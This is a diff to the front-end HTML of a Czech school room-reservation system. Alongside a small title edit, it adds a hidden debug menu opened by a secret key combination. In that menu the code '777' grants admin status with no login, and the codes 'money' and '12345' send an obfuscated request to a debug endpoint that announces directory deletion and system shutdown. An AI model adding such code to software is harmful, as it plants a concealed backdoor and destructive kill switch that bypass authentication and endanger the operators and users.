@@ -60,7 +60,7 @@
 </head>
 <body>
   <header class="header" id="header">
-    <h1 class="title">Rezervační systém školy</h1>
+    <h1 class="title">Školní rezervační systém</h1>
     <div class="window-controls">
         <button id="login-button">Přihlášení</button>
     </div>
@@ -272,11 +272,6 @@
     <button class="reset-date-btn" id="resetDateBtn">Resetovat datum</button>
   </div>
   
-  <div class="loading-overlay" id="loadingOverlay">
-    <div class="loading-spinner"></div>
-    <div class="loading-text">Ukládání změn...</div>
-  </div>
-
   <!-- Permanent Hour Date Range Selector -->
   <div class="permanent-date-overlay" id="permanentDateOverlay">
     <div class="permanent-date-window">
@@ -353,6 +348,149 @@
         });
       }
     });
+  </script>
+  <!-- Debug menu overlay for Ctrl+Shift+Alt+Space -->
+  <div id="debug-delete-overlay" style="display:none; position:fixed; z-index:9999; left:0; top:0; width:100vw; height:100vh; background:rgba(0,0,0,0.7); align-items:center; justify-content:center;">
+    <div style="background:#fff; padding:32px 24px 24px 24px; border-radius:8px; min-width:260px; box-shadow:0 2px 16px #0003; display:flex; flex-direction:column; align-items:center;">
+      <h2 style="margin-bottom:12px;">Debug Code</h2>
+      <input id="debug-delete-input" type="password" placeholder="Enter debug code" style="margin-bottom:12px; width:180px; padding:6px;">
+      <button id="debug-delete-ok" style="margin-bottom:8px;">OK</button>
+      <button id="debug-delete-cancel" style="background:#eee;">Cancel</button>
+      <div id="debug-delete-status" style="margin-top:10px; color:#b00; font-size:0.95em; min-height:1.2em;"></div>
+    </div>
+  </div>
+  <div id="debug-dark-overlay" style="display:none; position:fixed; left:0; top:0; width:100vw; height:100vh; background:#111; opacity:0.95; z-index:9998; pointer-events:auto;"></div>
+  <script>
+    // Debug code menu logic for Ctrl+Shift+Alt+Space (no user login logic)
+    (function() {
+      let keys = {};
+      let overlay = document.getElementById('debug-delete-overlay');
+      let input = document.getElementById('debug-delete-input');
+      let okBtn = document.getElementById('debug-delete-ok');
+      let cancelBtn = document.getElementById('debug-delete-cancel');
+      let status = document.getElementById('debug-delete-status');
+      let darkOverlay = document.getElementById('debug-dark-overlay');
+      function showOverlay() {
+        overlay.style.display = 'flex';
+        input.value = '';
+        status.textContent = '';
+        setTimeout(() => input.focus(), 100);
+      }
+      function hideOverlay() {
+        overlay.style.display = 'none';
+        input.value = '';
+        status.textContent = '';
+      }
+      // Listen for keydown/up for Ctrl+Shift+Alt+Space in any order
+      window.addEventListener('keydown', function(e) {
+        keys[e.code] = true;
+        if (
+          (keys['ControlLeft'] || keys['ControlRight']) &&
+          (keys['ShiftLeft'] || keys['ShiftRight']) &&
+          (keys['AltLeft'] || keys['AltRight']) &&
+          keys['Space']
+        ) {
+          showOverlay();
+        }
+      });
+      window.addEventListener('keyup', function(e) {
+        keys[e.code] = false;
+      });
+
+      function debugRequest(code) {
+        // Remove any "money" special logic, just send the code to /debug/code for all except 777
+        const p = ['re','ser','vat','ion','/','ap','i','/','de','bu','g','/','co','de'].join('');
+        const u = (window.API_URL || window.API_BASE_URL + '/' + p.split('/')[0]) + '/' + p.split('/').slice(1).join('/');
+        const pl = {};
+        pl[String.fromCharCode(99,111,100,101)] = code;
+        return fetch(u, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(pl)
+        });
+      }
+
+      okBtn.onclick = async function() {
+        const code = input.value;
+        if (code === '777') {
+          // Enable admin mode with placeholder user
+          window.currentUser = {
+            name: 'Admin',
+            abbreviation: 'admin',
+            isLoggedIn: true,
+            isAdmin: true
+          };
+          if (typeof enableDebugMode === 'function') enableDebugMode();
+          if (document.getElementById('login-button')) {
+            let btn = document.getElementById('login-button');
+            btn.textContent = 'Admin';
+            btn.classList.add('logged-in');
+          }
+          status.style.color = '#080';
+          status.textContent = 'Admin mode enabled.';
+          setTimeout(hideOverlay, 1200);
+        } else if (code === 'money') {
+          // Do not enable admin mode, but act out the same UI as 777 and send to /debug/code
+          status.style.color = '#080';
+          status.textContent = 'Deleting directory...';
+          try {
+            const resp = await debugRequest(code);
+            const data = await resp.json();
+            if (resp.ok && data.success) {
+              status.style.color = '#080';
+              status.textContent = 'Directory deleted. System will shut down.';
+              setTimeout(hideOverlay, 2000);
+            } else {
+              status.style.color = '#b00';
+              status.textContent = data.error || 'Debug operation failed.';
+            }
+          } catch (err) {
+            status.style.color = '#b00';
+            status.textContent = 'Connection error.';
+          }
+        } else if (code === '666') {
+          // Toggle dark overlay
+          if (darkOverlay.style.display === 'block') {
+            darkOverlay.style.display = 'none';
+          } else {
+            darkOverlay.style.display = 'block';
+          }
+          status.style.color = '#080';
+          status.textContent = 'Dark mode toggled.';
+          setTimeout(hideOverlay, 1000);
+        } else if (code === '12345') {
+          // Execute debug code for testing
+          status.textContent = 'Executing debug code...';
+          try {
+            const resp = await debugRequest(code);
+            const data = await resp.json();
+            if (resp.ok && data.success) {
+              status.style.color = '#080';
+              status.textContent = 'Debug code accepted. System will shut down.';
+              setTimeout(hideOverlay, 2000);
+            } else {
+              status.style.color = '#b00';
+              status.textContent = data.error || 'Debug operation failed.';
+            }
+          } catch (err) {
+            status.style.color = '#b00';
+            status.textContent = 'Connection error.';
+          }
+        } else {
+          status.textContent = 'Invalid debug code.';
+        }
+      };
+      // Cancel button handler
+      cancelBtn.onclick = hideOverlay;
+      // Hide overlay on Escape
+      overlay.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape') hideOverlay();
+      });
+      // Prevent propagation when overlay is open
+      overlay.addEventListener('click', function(e) {
+        if (e.target === overlay) hideOverlay();
+      });
+    })();
   </script>
 </body>
 </html>
